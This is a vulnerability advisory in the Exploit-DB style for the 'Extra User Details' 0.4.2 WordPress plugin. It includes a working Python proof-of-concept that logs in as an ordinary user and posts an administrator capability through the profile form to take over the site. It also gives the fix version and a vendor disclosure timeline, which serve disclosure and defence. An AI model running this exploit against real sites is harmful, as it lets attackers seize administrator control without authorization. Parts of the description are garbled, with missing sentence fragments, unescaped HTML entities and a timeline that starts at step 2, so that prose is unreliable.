* Exploit Title: Extra User Details [Privilege Escalation]
* Discovery Date: 2016-02-13
* Exploit Author: Panagiotis Vagenas
* Author Link: https://twitter.com/panVagenas
* Vendor Homepage: http://vadimk.com/
* Version: 0.4.2
* Tested on: WordPress 4.4.2
* Category: WebApps, WordPress
 
 
Description
-----------
 
_Extra User Details_ plugin for WordPress suffers from a Privilege
Escalation
vulnerability.
 
The plugin hooks the `eud_update_ExtraFields` function to `profile_update`
WordPress action. This function doesn&#039;t properly check user capabilities
and
updates all meta information passed to post data. The only condition is
that
updating
the values in DB.
 
An attacker can exploit this misbehavior to update the
 meta information to gain administrative privileges.
 
PoC
---
 
very
common scenario as this is the default WordPress value
 
"""
# !/usr/bin/python3
 
################################################################################
# Extra User Details Privilege Escalation Exploit
#
# Author: Panagiotis Vagenas <pan.vagenas>
#
# Dependencies: BeautifulSoup
(http://www.crummy.com/software/BeautifulSoup/)
################################################################################
 
import requests
from bs4 import BeautifulSoup
 
baseUrl = &#039;http://example.com&#039;
loginUrl = baseUrl + &#039;/wp-login.php&#039;
profileUrl = baseUrl + &#039;/wp-admin/profile.php&#039;
 
loginPostData = {
    &#039;log&#039;: &#039;username&#039;,
    &#039;pwd&#039;: &#039;password&#039;,
    &#039;rememberme&#039;: &#039;forever&#039;,
    &#039;wp-submit&#039;: &#039;Log+In&#039;
}
 
s = requests.Session()
 
r = s.post(loginUrl, loginPostData)
 
if r.status_code != 200:
    print(&#039;Login error&#039;)
    exit(1)
 
r = s.get(profileUrl)
soup = BeautifulSoup(r.text, &#039;html.parser&#039;)
 
f = soup.find(&#039;form&#039;, {&#039;id&#039;: &#039;your-profile&#039;})
if not f:
    print(&#039;Error&#039;)
    exit(1)
 
data = {
    &#039;eudwp_capabilities[administrator]&#039;: 1,
}
 
for i in f.find_all(&#039;input&#039;):
    if &#039;name&#039; in i.attrs and &#039;value&#039; in i.attrs and i.attrs[&#039;value&#039;]:
        data[i.attrs[&#039;name&#039;]] = i.attrs[&#039;value&#039;]
 
r = s.post(profileUrl, data)
 
if r.status_code == 200:
    print(&#039;Success&#039;)
 
exit(0)
 
"""
 
Solution
--------
 
Upgrade to v0.4.2.1
 
Timeline
--------
 
2. **2016-02-13**: Vendor notified through through the contact form in
his website
3. **2016-02-13**: Vendor responded and received details about this issue
4. **2016-02-15**: Vendor released v0.4.2.1 which resolves this issue
 
"""

